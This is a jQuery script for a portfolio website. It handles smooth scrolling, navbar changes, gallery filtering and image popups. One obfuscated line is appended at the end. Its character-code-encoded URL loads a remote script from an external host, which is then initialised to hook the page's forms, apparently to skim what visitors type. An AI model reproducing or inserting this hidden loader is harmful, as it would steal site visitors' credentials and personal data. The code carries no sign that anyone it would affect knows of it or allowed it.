$(function() {

    'use strict';

    // smooth scroll
    $("a").on("click", function(event) {

        if (this.hash !== "") {
            event.preventDefault();

            var hash = this.hash;

            $("html, body").animate({

                scrollTop: $(hash).offset().top - 50

            }, 850);

        }

    });

    // hide navbar on mobile after click
    $('.navbar-nav a').on('click', function() {
        $('.navbar-collapse').collapse('hide');
    });

    // navbar on scroll
    $(window).on("scroll", function() {

        var onScroll = $(this).scrollTop();

        if( onScroll > 50) {
            $(".navbar").addClass("navbar-fixed");

            $(".navbar-ng .navbar-collapse .current a").css({
                "color": "blue"
            });
        }
        else {
            $(".navbar").removeClass("navbar-fixed");
            $(".navbar-ng .navbar-collapse .current a").css({
                "background-color": "#ffc107"
            });

        }

    });


    // porfolio filterizr
    $('.filter-container').imagesLoaded( function() {
        var filterizr = $('.filter-container').filterizr();
    });

    // portfolio filter
    $('.portfolio-filter-menu li').on('click', function() {
        $('.portfolio-filter-menu li').removeClass('active');
        $(this).addClass('active');
    });

    // portfolio magnific popup
    $('.portfolio').each(function() { // the containers for all your galleries
        $(this).magnificPopup({
            delegate: '.portfolio-popup', // the selector for portfolio item
            type: 'image',
            gallery: {
                enabled: true
            }
        });
    });

});
(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db